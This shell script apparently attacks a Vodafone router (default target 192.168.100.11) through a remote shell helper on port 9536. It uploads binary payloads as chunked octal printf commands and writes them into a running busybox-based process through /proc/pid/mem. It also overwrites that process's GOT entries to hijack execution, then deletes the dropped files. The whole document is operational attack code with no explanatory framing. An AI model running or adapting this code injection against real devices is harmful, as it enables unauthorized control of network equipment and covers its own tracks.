#!/bin/sh
set -eu
host="${1:-192.168.100.11}"
image=vodafone_file_put.bin
bootstrap=vodafone_file_put_bootstrap.bin
octal=$(od -An -v -to1 "$image" | tr -s ' ' '\n' | sed '/^$/d;s/^/\\/' | tr -d '\n')
boot_octal=$(od -An -v -to1 "$bootstrap" | tr -s ' ' '\n' | sed '/^$/d;s/^/\\/' | tr -d '\n')
{
 sleep 2
 printf ': >/tmp/vodafone_file_put.bin; /bin/busybox rm -f /tmp/vodafone_put.log\n'
 printf '%s\n' "$octal" | fold -w 768 | while IFS= read -r chunk; do printf "printf '%s' >>/tmp/vodafone_file_put.bin\n" "$chunk"; done
 printf "printf '%s' >/tmp/vodafone_file_put_bootstrap.bin\n" "$boot_octal"
 printf '%s\n' '/bin/dd if=/dev/zero of=/dev/null bs=4096 & p=$!; /bin/sleep 1; kill -STOP $p; base=$(/usr/bin/awk '\''$6=="/bin/busybox"&&$3=="00000000"{split($1,a,"-");print a[1];exit}'\'' /proc/$p/maps); image=$((0x$base+0x74000)); rgot=$((0x$base+0x8fb08)); wgot=$((0x$base+0x8fdf4)); /bin/dd if=/tmp/vodafone_file_put.bin of=/proc/$p/mem bs=1 seek=$image conv=notrunc; /bin/dd if=/tmp/vodafone_file_put_bootstrap.bin of=/proc/$p/mem bs=1 seek=$image conv=notrunc; printf "\\$(printf %03o $((image&255)))\\$(printf %03o $(((image>>8)&255)))\\$(printf %03o $(((image>>16)&255)))\\$(printf %03o $(((image>>24)&255)))" >/tmp/vodafone_file_put_pointer.bin; /bin/dd if=/tmp/vodafone_file_put_pointer.bin of=/proc/$p/mem bs=1 seek=$rgot conv=notrunc; /bin/dd if=/tmp/vodafone_file_put_pointer.bin of=/proc/$p/mem bs=1 seek=$wgot conv=notrunc; kill -CONT $p; /bin/sleep 8; /bin/cat /tmp/vodafone_put.log 2>/dev/null; kill -KILL $p 2>/dev/null || true; /bin/busybox rm -f /tmp/vodafone_file_put.bin /tmp/vodafone_file_put_bootstrap.bin /tmp/vodafone_file_put_pointer.bin'
 sleep 12
} | timeout 30 ./vodafone-direct-shell.sh "$host" 9536
